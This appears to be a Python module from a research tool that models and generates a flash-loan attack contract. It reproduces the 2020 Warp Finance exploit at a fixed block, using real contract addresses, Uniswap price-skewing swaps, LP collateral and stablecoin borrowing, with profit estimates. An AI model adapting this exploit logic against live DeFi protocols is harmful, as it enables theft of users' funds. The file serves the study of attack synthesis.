import sys
import os
import itertools
import math
import builtins
import time
from black import out
from numpy import insert
import config

from scipy.interpolate import griddata, interp1d
import scipy.optimize as optimize
from scipy.interpolate import NearestNDInterpolator

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
sys.path.append(os.path.dirname(SCRIPT_DIR))
from Actions.SingleApprox.SingleApprox import single_round_approx, predict
from Actions.Utils import *
from Actions.UtilsPrecision import *

class WarpAction():    
    initialStates = [58010988, 90409, 1887324]
    globalStates = initialStates.copy()
    # globalStates[0]: Uniswap DAI liquidity   
    # globalStates[1]: Uniswap WETH liquidity   
    # globalStates[2]: Uniswap total supply
    
    initialBalances = {"WETH": 500000, "DAI": 5000000}
    currentBalances = {"WETH": 500000, "DAI": 5000000}
    TargetTokens = {'DAI', 'USDC', 'WETH'}
    TokenPrices = {'DAI': 1.0, 'USDC':1.0, "WETH": 641.65}


    startStr_contract = '''// SPDX-License-Identifier: AGPL-3.0-or-later
pragma solidity ^0.7.0;
pragma experimental ABIEncoderV2;
import "./interfaces/WarpI.sol";
// Block 11473330
// Block index 65
// Timestamp Thu, 17 Dec 2020 22:24:41 +0000
// Gas price 89 gwei
// Gas limit 3656990
// 

contract Warp_attack {
    address EOA;
    address private constant WETHAddress = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant DAIAddress = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address private constant UniswapV2Router02Address = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address private constant UniswapDAT2ETHAdress = 0xA478c2975Ab1Ea89e8196811F51A7B7Ade33eB11;
    address private constant UniswapSoloMarginAddress = 0x1E0447b19BB6EcFdAe1e4AE1694b0C3659614e4e;
    address private constant WarpVaultLPAddress = 0x13db1CB418573f4c3A2ea36486F0E421bC0D2427;
    address private constant WarpControlAddress = 0xBa539B9a5C2d412Cb10e5770435f362094f9541c;
    address private constant WarpUSDCVaultSCAddress = 0xae465FD39B519602eE28F062037F7B9c41FDc8cF;
    address private constant WarpDAIValutSCAddress = 0x6046c3Ab74e6cE761d218B9117d5c63200f4b406;
    address private constant USDCAddress = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address private constant SushiswapUSDC2ETHAddress = 0x397FF1542f962076d0BFE58eA045FfA2d347ACa0;

    IUniswapV2Pair UNI_V2 = IUniswapV2Pair(UniswapDAT2ETHAdress);  // token0 = DAI   token1 = WETH
    IUniswapV2Router02 UNIV2_router = IUniswapV2Router02(UniswapV2Router02Address);

    IERC20 WETH = IERC20(WETHAddress);
    IERC20 DAI = IERC20(DAIAddress);
    IERC20 USDC = IERC20(USDCAddress);
    WarpVaultLP warpVaultLP = WarpVaultLP(WarpVaultLPAddress);
    WarpControl warpControl = WarpControl(WarpControlAddress);

    address private constant comptrollerAddress = 0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B;
    address private constant cETHAddress = 0x4Ddc2D193948926D02f9B1fE9e1daa0718270ED5;
    address private constant cDAIAddress = 0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643;
    ICEther cETH = ICEther(payable(cETHAddress));
    CTokenInterface cDAI = CTokenInterface(cDAIAddress);

    uint reserve0 = 0;
    uint reserve1 = 0;
    uint balance = 0;
    string str1 = "";
    string str2 = "";
    string str3 = "";
    string str4 = "";

    string str80 = "";
    string str81 = "";
    string str82 = "";

    uint DAIamount;
    uint AmountIn;
    uint WETHIn;
    uint DAIOut;
    uint liquidity;


    constructor() payable {
        require(msg.value == 500000 ether, "loan amount does not match");
        DAI.approve(UniswapSoloMarginAddress, 2**256 - 1);
        WETH.approve(UniswapSoloMarginAddress, 2**256 - 1);
        UNI_V2.approve(WarpVaultLPAddress, 2**256 - 1);
        EOA = msg.sender;
        // step 1: 500,000 WETH and 5 million DAI
        IWETH(WETHAddress).deposit{ value: 500000 ether }();
        // =============================================== Now we have enough ETH and DAI =============================================
    }

    receive() external payable {}

    '''
    
    startStr_attack = '''
    // loan amount = 500,000 WETH and 5 million DAI
    function attack( $$_$$ ) public {

    '''

    endStr_attack = '''
                    revert(ProfitSummary());
        // loan amount = 500000 ETH and 2.9 million DAI
        // USDC balance: 3917983 || DAI balance: 5962616 || WETH balance: 495033
        // 1 WETH = 641.65 DAI;  1 USDT = 1 DAI
        // Profit = 3917983 + 5962616 - 5000000 - (500000 - 495033) * 641.65 = 1693523.45 usd
    }
    
    '''

    endStr_contract = """
    function UNI_V2Summary() internal returns (string memory _uintAsString){
        (reserve0, reserve1, ) = UNI_V2.getReserves();
        str80 = append("DAI Liquidity: ", uint2str(reserve0 / 10 ** 18));
        str81 = append(" || WETH Liquidity: ", uint2str(reserve1 / 10 ** 18));
        return append(str80, str81);
    } 

    function ProfitSummary() internal returns (string memory _uintAsString){
        uint balance1 = USDC.balanceOf(address(this)) / 10 ** 6;
        uint balance2 = DAI.balanceOf(address(this)) / 10 ** 18;
        uint balance3 = WETH.balanceOf(address(this)) / 10 ** 18;
        str80 = append("USDC balance: ", uint2str(balance1));
        str81 = append(" || DAI balance: ", uint2str(balance2));
        str82 = append(" || WETH balance: ", uint2str(balance3));
        return append(append(str80, str81), str82);
    }

    function uint2str(uint _i) internal pure returns (string memory _uintAsString) {
        if (_i == 0) {
            return "0";
        }
        uint j = _i;
        uint len;
        while (j != 0) {
            len++;
            j /= 10;
        }
        bytes memory bstr = new bytes(len);
        uint k = len - 1;
        while (_i != 0) {
            bstr[k--] = byte(uint8(48 + _i % 10));
            _i /= 10;
        }
        return string(bstr);
    }


    function append(string memory a, string memory b) internal pure returns (string memory) {
        return string(abi.encodePacked(a, b));
    }

    function appendWithSpace(string memory a, string memory b) internal pure returns (string memory) {
        return append(a, append(" ", b));
    }

}

"""
    
    @classmethod
    def resetBalances(cls):
        cls.currentBalances = cls.initialBalances.copy()
        cls.globalStates = cls.initialStates.copy()

    def calcProfit(stats):
        if stats == None or len(stats) != 3:
            return 0
        profit = stats[0] + (stats[1] - 5000000) + (stats[2] - 500000) *  641.65
        return profit

    @classmethod
    def calcProfit2(cls):
        profit = 0
        for token in cls.currentBalances.keys():
            currentBalance = cls.currentBalances[token]
            earned = currentBalance
            if token in cls.initialBalances.keys():
                initialBalance = cls.initialBalances[token]
                earned -= initialBalance
            if token in cls.TokenPrices.keys():
                profit += earned * cls.TokenPrices[token]
        return profit

    @classmethod
    def buildAttackContract(cls, ActionList):
        start = cls.startStr_attack
        end = cls.endStr_attack
        return buildAttackContract(start, ActionList, end)
        
    @classmethod
    def buildCollectorContract(cls, ActionList):
        start = cls.startStr_attack
        end = '''
        }
        '''
        return buildCollectorContract(start, ActionList, end)

    def ToString(ActionList):
        return ToString(ActionList)
            



class MintLPUniswapV2(WarpAction):
    numInputs = 1
    tokensIn = ['DAI', 'WETH']
    tokensOut = ['LP']
    range = [0, 5000000]  # DAI 2900030

    @classmethod
    def actionStr(cls):
        action = "      // Action: MintLPUniswapV2\n"
        action += '''       DAIamount = $$ * 10 ** 18;
        (reserve0, reserve1, ) = UNI_V2.getReserves();
        WETH.transfer(UniswapDAT2ETHAdress, DAIamount * reserve1 / reserve0 );
        DAI.transfer(UniswapDAT2ETHAdress, DAIamount );
        UNI_V2.mint(address(this));
        '''
        return action


    @classmethod
    def aliquotValues(cls, values):
        # print(values)
        return values[2], values[3], values[4]

    @classmethod
    def simulate(cls, input):
        output0 = cls.globalStates[0] + input
        WETHCost = input * cls.globalStates[1] / cls.globalStates[0] 
        output1 = cls.globalStates[1] + WETHCost
        output2 = input / cls.globalStates[0] * cls.globalStates[2]

        return output0, output1, output2


    @classmethod
    def transit(cls, input): # Assume input is a value
        cls.currentBalances['DAI'] -= input
        WETHCost = input * cls.globalStates[1] / cls.globalStates[0] 
        cls.currentBalances['WETH'] -= WETHCost

        output0, output1, output2 = cls.simulate(input)

        cls.globalStates[0] = output0
        cls.globalStates[1] = output1
        cls.globalStates[2] += output2

        if "LP" not in cls.currentBalances:
            cls.currentBalances["LP"] = output2
        else:
            cls.currentBalances["LP"] += output2
        return

    @classmethod
    def string(cls):
        return "MintLPUniswapV2"

class SwapUniswapWETH2DAI(WarpAction):
    numInputs = 1
    tokensIn = ['WETH']
    tokensOut = ['DAI']
    range = [0, 500000]  # 341217.04

    @classmethod
    def actionStr(cls):
        action = "      // Action: SwapUniswapWETH2DAI\n"
        action += '''       WETHIn = $$ * 10 ** 18;
        (reserve0,  reserve1, ) = UNI_V2.getReserves();
        WETH.transfer(UniswapDAT2ETHAdress, WETHIn);
        DAIOut = 997 * WETHIn * reserve0 / (1000 * reserve1 + 997 * WETHIn);
        UNI_V2.swap(DAIOut, 0, address(this), new bytes(0));
        '''
        return action

    @classmethod
    def simulate(cls, input):
        newWETHLiquidity = cls.globalStates[1] + input  # WETH
        DAIOut = 997 * input * cls.globalStates[0] / (1000 * cls.globalStates[1]  + 997 * input)
        newDAILiquidity =  cls.globalStates[0] - DAIOut
        return newDAILiquidity, newWETHLiquidity, DAIOut

    @classmethod
    def transit(cls, input):
        # inputs = [cls.globalStates[0], cls.globalStates[1], input]
        cls.currentBalances["WETH"] -= input

        newDAILiquidity, newWETHLiquidity, DAIOut = cls.simulate(input)

        cls.globalStates[0] = newDAILiquidity
        cls.globalStates[1] = newWETHLiquidity
        cls.currentBalances["DAI"] += DAIOut
        return 

    @classmethod
    def string(cls):
        return "SwapUniswapWETH2DAI"
        
class SwapUniswapDAI2WETH(WarpAction):
    numInputs = 1
    tokensIn = ['DAI']
    tokensOut = ['WETH']
    range = [0, 60000000] # 47622329

    @classmethod
    def actionStr(cls):
        action = "      // Action: SwapUniswapDAI2WETH\n"
        action += '''       
        DAIamount = $$ * 10 ** 18;
        (reserve0,  reserve1, ) = UNI_V2.getReserves();
        DAI.transfer(UniswapDAT2ETHAdress, DAIamount);
        UNI_V2.swap(0, 997 * DAIamount * reserve1 / (1000 * reserve0 + 997 * DAIamount), address(this), new bytes(0));

        '''
        return action


    @classmethod
    def aliquotValues(cls, values):
        # print(values)
        return values[2], values[3], values[4]


    @classmethod
    def simulate(cls, input):
        newDAILiquidity = cls.globalStates[0] + input
        WETHOut = 997*input*cls.globalStates[1]/(1000 * cls.globalStates[0] + 997 * input) 
        newWETHLiquidity = cls.globalStates[1] - WETHOut
        return newDAILiquidity, newWETHLiquidity, WETHOut

    @classmethod
    def transit(cls, input):
        cls.currentBalances["DAI"] -= input

        newDAILiquidity, newWETHLiquidity, WETHOut = cls.simulate(input)

        cls.globalStates[0] = newDAILiquidity
        cls.globalStates[1] = newWETHLiquidity
        cls.currentBalances["WETH"] += WETHOut
        return 

    @classmethod
    def string(cls):
        return "SwapUniswapDAI2WETH"




# Actions below require approximated expression
class LP2BorrowLimit(WarpAction):
    numInputs = 1
    range = [0, 120000]  # 66184
    tokensIn = ['LP']
    tokensOut = ['BL']

    
    @classmethod
    def actionStr(cls):
        action = "      // Action: LP2BorrowLimit\n"
        action += '''       warpVaultLP.provideCollateral( $$ *10**18);\n'''
        return action


    @classmethod
    def simulate(cls, input):
        inputs = [cls.globalStates[0], cls.globalStates[1], input]
        WETHPrice = 55533384218085 / 94928655114461712381666 * 10 ** 18
        DAIPrice = 61019626696396 / 60911018344037202213498302 * 10 ** 18
        WETHAmount = cls.globalStates[1]
        DAIAmount = cls.globalStates[0]
        LPtotalSupply = cls.globalStates[2]
        LPPrice = (WETHAmount * WETHPrice + DAIAmount * DAIPrice) / LPtotalSupply
        BL = LPPrice * input * 2 / 3 / 10 ** 6
        return [BL]


    @classmethod
    def transit(cls, input):
        cls.currentBalances['LP'] -= input

        output0 = cls.simulate(input)[0]

        if 'BL' not in cls.currentBalances:
            cls.currentBalances['BL'] = 0
        cls.currentBalances['BL'] += output0
        return

    @classmethod
    def string(cls):
        return "LP2BorrowLimit"



class BorrowSC_USDC(WarpAction):
    numInputs = 1
    tokensIn = ['BL']
    tokensOut = ['USDC']
    range = [0, 3917983] # 3917983

    @classmethod
    def actionStr(cls):
        action = "      // Action: BorrowSC_USDC\n"
        action += '''       warpControl.borrowSC(USDCAddress, $$ * 10 ** 6);\n'''
        return action
    
    @classmethod
    def simulate(cls, input):
        inputs = [input]
        output0 = input
        output1 = input
        
        return output0, output1


    @classmethod
    def transit(cls, input):
        output0, output1 = cls.simulate(input)

        if 'USDC' not in cls.currentBalances:
            cls.currentBalances['USDC'] = output0
        else:
            cls.currentBalances['USDC'] += output1

        cls.currentBalances['BL'] -= output1 
        return


    @classmethod
    def string(cls):
        return "BorrowSC_USDC"


class BorrowSC_DAI(WarpAction):
    points = []
    values = [[], []]   
        # value0s: Warp getTotalBorrowedValue
    approximator0 = None
    approximator1 = None
    hasNewDataPoints = True

    numInputs = 1
    tokensIn = ['BL']
    tokensOut = ['DAI']
    range = [0, 3862646] # 3862646


    @classmethod
    def actionStr(cls):
        action = "      // Action: BorrowSC_DAI\n"
        action += '''       warpControl.borrowSC(DAIAddress, $$ * 10 ** 18);\n'''
        return action

    @classmethod
    def simulate(cls, input):
        output0 = input
        output1 = input * 1.00178297468
        return output0, output1


    @classmethod
    def transit(cls, input):
        output0, output1 = cls.simulate(input)

        cls.currentBalances['DAI'] += output0
        cls.currentBalances['BL'] -= output1 

    @classmethod
    def string(cls):
        return "BorrowSC_DAI"
        




def main():

    # config.method
    # config.contract_name 
    # config.initialEther 
    # config.blockNum
    # config.ETHorBSCorDVDorFantom

    config.method = 0
    config.ETHorBSCorDVDorFantom = 0
    config.initialEther = 518000
    config.blockNum = 11473330
    config.contract_name = "Warp_attack"

    
# Test for initial pass of data collecton: 


    print("==========================================================================================================================")
    action1 = MintLPUniswapV2
    action2 = SwapUniswapWETH2DAI
    action3 = SwapUniswapDAI2WETH
    action4 = LP2BorrowLimit
    action5 = BorrowSC_USDC
    action6 = BorrowSC_DAI
    action_list = [action1, action2, action4, action5, action6, action3]
    initial_guess = [2900030, 341217, 94349, 3917983, 3862646, 47622329]

    ActionWrapper = WarpAction

    # print("actual profit: ", getActualProfit(initial_guess, ActionWrapper, action_list))

    actual_profit = 1693523.4500000002
    print("actual profit: ", actual_profit)
    estimate_profit = getEstimatedProfit_precise_display(initial_guess, ActionWrapper, action_list, True)
    print("estimated profit: ", estimate_profit)
    return actual_profit, estimate_profit




if __name__ == "__main__":
    main()
    